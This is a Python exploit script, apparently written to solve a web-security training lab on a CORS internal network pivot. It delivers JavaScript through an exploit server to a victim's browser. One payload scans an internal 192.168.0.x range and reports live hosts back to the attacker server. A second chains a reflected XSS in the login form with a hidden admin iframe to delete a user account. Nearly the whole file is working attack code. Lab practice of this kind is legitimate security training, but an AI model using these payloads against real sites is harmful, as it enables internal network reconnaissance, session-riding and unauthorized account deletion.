# CORS vulnerability with internal network pivot attack

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def deliver_payload(s, url, payload, attacker):
	post_exploit_path = attacker
	post_exploit_data = {
		"formAction": "STORE",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r1 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(2)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r2 = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path + post_exploit_data['responseFile'])
	return r2

def get_host_ip(s, url, attacker):
	attacker_url = attacker
	exploit_body = f"""
<script>
for(let i=0; i<256; i++) {{
	fetch(`http://192.168.0.${{i}}:8080`)
	.then(response => response.text())
	.then(text => {{
		fetch(`{attacker}?ip=192.168.0.${{i}}`)
	}})
}}
</script>
"""
	r = deliver_payload(s, url, exploit_body, attacker)
	print('[+] Retrieving the host IP in the exploit-server logs...')
	time.sleep(10)
	r = s.get(attacker + '/log')
	time.sleep(1)
	res = r.text
	host_ip = re.findall(r"\?ip=(.*) HTTP/1.1", res)[-1]
	print(host_ip)
	if len(host_ip) == 0:
		print('[-] Can NOT retrieve the host IP in the exploit-server logs <!>')
		sys.exit(-1)
	else:
		print('[+] Found the host IP in the exploit-server logs:\t%s' % host_ip)
		return host_ip

def delete_user(s, url, attacker, host):
	attacker_url = attacker.replace('https', 'http')
	exploit_body = """<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now() + '&username=' + encodeURIComponent(vector) + '&password=test&csrf=' + text.match(/csrf" value="([^"]+)">/)[1];
}
function fetchUrl(url){
	fetch(url)
	.then(r => r.text()
	.then(text => {
		xss(url, text, '"><iframe src=/admin onload="var f = this.contentWindow.document.forms[0];if(f.username) f.username.value=\\'carlos\\',f.submit()">');
	}))
}
fetchUrl('http://""" + host + """:8080');
</script>
"""
	print('[+] Trying to send XSS via CORS attack...')
	r = deliver_payload(s, url, exploit_body, attacker)
	time.sleep(3)
	return r

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv
	else:
		print("[-] Didn't find exploit server on the home page <!>")
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>\n' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: CORS vulnerability with internal network pivot attack')
	print('[+] Begins at:\t%s' % time.strftime("%H:%M:%S"))
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		exploit_srv = find_exploit_srv(r)
		attacker = urllib.parse.urlparse(exploit_srv).scheme + "://" + urllib.parse.urlparse(exploit_srv).netloc
		time.sleep(1)
		if '<h1>Error</h1>' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send a CORS attack to find the host...')
			host_ip = get_host_ip(s, url, attacker)
			time.sleep(2)
			r = delete_user(s, url, attacker, host_ip)
			time.sleep(2)
			r = s.get(url, allow_redirects=False)
			time.sleep(1)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
			print('[+] Finished at:\t%s' % time.strftime("%H:%M:%S"))
	except requests.exceptions.ProxyError:
		print('\n[-] PROXY seems to be missconfigured <!>')


if __name__ == "__main__":
	main()
